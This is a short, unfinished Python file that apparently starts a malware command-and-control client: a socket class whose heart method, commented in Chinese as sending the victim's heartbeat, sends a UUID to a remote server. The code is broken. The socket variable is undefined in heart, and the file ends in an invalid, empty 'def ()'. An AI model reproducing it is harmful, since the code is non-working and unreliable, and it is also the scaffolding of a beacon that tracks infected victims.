import socket
import time


class Socketz():

	def __init__(self,host,port,data=""):
		self.host = host
		self.port = port
		self.data = data


	def connect(self):
		sock = socket.socket()
		HOST = self.host
		PORT = self.port
		sock.connect((HOST, PORT))
		return None
	 

	def heart(self):
		#发送被害心跳的函数
		sock.send("heart".encode("utf-8"))
		my = sock.recv(1024).decode("utf-8")
		#发送uuid
		sock.send(self.data.encode("utf-8"))
		server_rec = sock.recv(1024).decode("utf-8")

		return server_rec


	def ()



